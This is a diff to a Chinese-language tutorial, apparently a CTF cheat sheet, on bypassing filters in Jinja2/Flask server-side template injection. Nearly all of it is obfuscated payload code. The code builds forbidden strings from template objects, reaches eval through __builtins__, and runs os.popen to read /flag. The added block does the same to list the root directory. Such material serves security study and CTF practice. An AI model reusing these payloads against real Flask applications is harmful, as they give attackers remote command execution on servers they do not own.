@@ -909,8 +909,8 @@ if __name__ == "__main__":
 ```python
 {% set zero = (({ }|select|string|list).pop(38)|int) %}    # 0
 {% set one = (zero**zero)|int %}{{one}}    # 1
-{%set two = (zero-one-one)|abs %}    # 2
-{%set three = (zero-one-one-one)|abs %}    # 3
+{% set two = (zero-one-one)|abs %}    # 2
+{% set three = (zero-one-one-one)|abs %}    # 3
 {% set five = (two*two*two)-one-one-one %}    # 5
 #  {%set four = (one+three) %}    注意, 这样的加号的是不行的,不知道为什么,只能用减号配合abs取绝对值了
 ```
@@ -1049,8 +1049,52 @@ Payload构造过程如下：
 
 # 最后的payload如下:
 {% set zero = (self|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set three = five-one-one %}{% set nine = (two*two*two*two-five-one-one) %}{% set seven = (zero-one-one-five)|abs %}{% set space = self|string|min %}{% set point = self|float|string|min %}{% set c = dict(c=aa)|reverse|first %}{% set bfh = self|string|urlencode|first %}{% set bfhc = bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set yin = bfhc%((three~nine)|int) %}{% set xhx = bfhc%((nine~five)|int) %}{% set right = bfhc%((four~one)|int) %}{% set left = bfhc%((four~zero)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set so = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx~xhx~but~xhx~xhx %}{% set ini = dict(ini=aa,t=bb)|join %}{% set glo = dict(glo=aa,bals=bb)|join %}{% set itm = dict(ite=aa,ms=bb)|join %}{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}{% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}{% if f == bul %}{% for a,b in (v|attr(itm))() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}
-```
 
+
+# ls /
+{% set zero = (g|int) %}
+{% set one = (zero**zero)|int %}
+{% set two = (zero-one-one)|abs %}
+{% set four = (two*two)|int %}
+{% set five = (two*two*two)-one-one-one %}
+{% set three = five-one-one %}
+{% set nine = (two*two*two*two-five-one-one) %}
+{% set seven = (zero-one-one-five)|abs %}
+{% set space = g|string|min %}
+{% set point = g|float|string|min %}
+{% set c = dict(c=aa)|reverse|first %}
+{% set bfh = g|string|urlencode|first %}
+{% set bfhc = bfh~c %}
+{% set slas = bfhc%((four~seven)|int) %}
+{% set yin = bfhc%((three~nine)|int) %}
+{% set xhx = bfhc%((nine~five)|int) %}
+{% set right = bfhc%((four~one)|int) %}
+{% set left = bfhc%((four~zero)|int) %}
+{% set but = dict(buil=aa,tins=dd)|join %}
+{% set imp = dict(imp=aa,ort=dd)|join %}
+{% set pon = dict(po=aa,pen=dd)|join %}
+{% set so = dict(o=aa,s=dd)|join %}
+{% set ca = dict(ca=aa,t=dd)|join %}
+{% set flg = dict(fl=aa,ag=dd)|join %}
+{% set ev = dict(ev=aa,al=dd)|join %}
+{% set red = dict(re=aa,ad=dd)|join %}
+{% set bul = xhx~xhx~but~xhx~xhx %}
+{% set ini = dict(ini=aa,t=bb)|join %}
+{% set glo = dict(glo=aa,bals=bb)|join %}
+{% set itm = dict(ite=aa,ms=bb)|join %}
+{% set ls = dict(l=aa,s=bb)|join %}
+{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ls~space~slas~yin~right~point~red~left~right %}
+
+{% for f,v in (whoami|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}
+    {% if f == bul %} 
+        {% for a,b in (v|attr(itm))() %}
+            {% if a == ev %}
+                {{b(pld)}}
+            {% endif %}
+        {% endfor %}
+    {% endif %}
+{% endfor %}
+```
 ## 过滤了request和class
 
 这里除了用上面中括号或 |attr() 那几种方法外，我们还可以利用flask里面的session对象和config对象来逃逸这一姿势。
